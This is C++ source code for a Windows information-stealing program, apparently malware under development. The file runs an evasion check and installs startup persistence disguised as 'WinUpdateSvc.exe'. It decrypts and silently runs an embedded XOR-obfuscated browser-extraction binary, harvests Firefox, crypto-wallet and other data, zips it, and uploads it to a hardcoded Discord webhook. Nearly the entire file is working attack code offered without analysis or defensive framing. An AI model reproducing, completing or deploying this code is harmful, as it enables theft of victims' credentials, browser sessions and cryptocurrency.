#include <windows.h>
#include <shlobj.h>
#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <winhttp.h>
#include <thread>
#include <chrono>
#include <tlhelp32.h>
#include "evasio.h"
#include "browsers.h"
#include "wallets.h"
#include "zipmem.h"
#include "resource.h"

#pragma comment(lib, "winhttp.lib")

static void dbg_log(const std::string& msg) {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string exeDir(exePath);
    size_t pos = exeDir.find_last_of("\\/");
    if (pos != std::string::npos) exeDir = exeDir.substr(0, pos);
    std::string logPath = exeDir + "\\debug_boot.txt";
    std::ofstream dbg(logPath, std::ios::app);
    dbg << msg << "\n";
    dbg.close();
}

static void install_persistence() {
    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    
    char localAppData[MAX_PATH]; // <-- DECLARADO AQUI, ANTES DE USAR
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        char persistDir[MAX_PATH];
        sprintf(persistDir, "%s\\Microsoft\\Windows", localAppData);
        CreateDirectoryA(persistDir, NULL);
        char persistExe[MAX_PATH];
        sprintf(persistExe, "%s\\WinUpdateSvc.exe", persistDir);
        CopyFileA(currentExe, persistExe, FALSE);
        
        char startupDir[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupDir))) {
            char startupExe[MAX_PATH];
            sprintf(startupExe, "%s\\WinUpdateSvc.exe", startupDir);
            CopyFileA(persistExe, startupExe, FALSE);
        }
    }
}

static bool is_process_running(const wchar_t* exeName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) { found = true; break; }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

static bool run_chromElevator_for(const std::wstring& browserArg, const std::wstring& outDir) {
    HRSRC hRes = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_CHROMELEVATOR), L"BINARY");
    if (!hRes) return false;
    HGLOBAL hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return false;
    BYTE* pData = (BYTE*)LockResource(hGlobal);
    DWORD size = SizeofResource(NULL, hRes);
    if (!pData || size == 0) return false;

    std::vector<BYTE> peData(size);
    for (DWORD i = 0; i < size; i++) peData[i] = pData[i] ^ 0xAB;

    wchar_t tmpPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tmpPath);
    std::wstring hiddenPath = std::wstring(tmpPath) + L"chromelevator.exe";
    HANDLE hFile = CreateFileW(hiddenPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD written = 0;
    WriteFile(hFile, peData.data(), (DWORD)peData.size(), &written, NULL);
    CloseHandle(hFile);

    std::wstring args = L"-k " + browserArg + L" -o \"" + outDir + L"\"";
    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    bool success = false;
    if (CreateProcessW(hiddenPath.c_str(), (LPWSTR)args.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, outDir.c_str(), &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 180000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        success = true;
    }
    DeleteFileW(hiddenPath.c_str());
    return success;
}

static bool send_to_discord(const std::wstring& filePath, const std::wstring& webhookUrl) {
    HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> fileData(fileSize);
    DWORD bytesRead = 0;
    ReadFile(hFile, fileData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    urlComp.dwHostNameLength = -1;
    urlComp.dwUrlPathLength = -1;
    urlComp.dwSchemeLength = -1;
    if (!WinHttpCrackUrl(webhookUrl.c_str(), (DWORD)webhookUrl.length(), 0, &urlComp)) return false;

    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path(urlComp.lpszUrlPath, urlComp.dwUrlPathLength);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;
    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring boundary = L"---------------------------Boundary";
    std::wstring bodyStart = L"--" + boundary + L"\r\nContent-Disposition: form-data; name=\"file\"; filename=\"grab.zip\"\r\nContent-Type: application/zip\r\n\r\n";
    std::wstring bodyEnd = L"\r\n--" + boundary + L"--\r\n";

    std::vector<BYTE> body;
    for (wchar_t c : bodyStart) body.push_back((BYTE)c);
    body.insert(body.end(), fileData.begin(), fileData.end());
    for (wchar_t c : bodyEnd) body.push_back((BYTE)c);

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + boundary;
    BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
    if (bResults) bResults = WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return bResults != FALSE;
}

int wmain() {
    char currentExe[MAX_PATH];
    GetModuleFileNameA(NULL, currentExe, MAX_PATH);
    bool isBoot = (strstr(currentExe, "WinUpdateSvc.exe") != NULL);

    if (!run_evasion()) return 0;
    install_persistence();

    if (isBoot) {
        int attempts = 0;
        bool browserFound = false;
        while (attempts < 360) {
            if (is_process_running(L"chrome.exe") || is_process_running(L"msedge.exe") ||
                is_process_running(L"brave.exe") || is_process_running(L"opera.exe")) {
                browserFound = true;
                break;
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
            attempts++;
        }
        if (!browserFound) return 0;
        std::this_thread::sleep_for(std::chrono::seconds(20));
    }

    std::wstring outRoot = L"C:\\grabber_output";
    CreateDirectoryW(outRoot.c_str(), nullptr);
    
    SYSTEMTIME st; GetLocalTime(&st);
    wchar_t stamp[32];
    swprintf(stamp, 32, L"%04d%02d%02d_%02d%02d%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    std::wstring outSpecific = outRoot + L"\\" + stamp;
    CreateDirectoryW(outSpecific.c_str(), nullptr);

    run_chromElevator_for(L"all", outSpecific);

    grab_firefox(outSpecific);
    grab_wallets(outSpecific);
    grab_misc(outSpecific);

    std::wstring zipName = outSpecific + L".zip";
    create_zip(outSpecific, zipName);

    std::wstring webhookUrl = L"https://discord.com/api/webhooks/1570265206372962304/bx-jcbTnH-WHZzCCCvAPS-Iz4mwyecP6dSrbixdwZjZYsqvWuawrHut1ZSrevsl_Co3Q";
    send_to_discord(zipName, webhookUrl);

    return 0;
}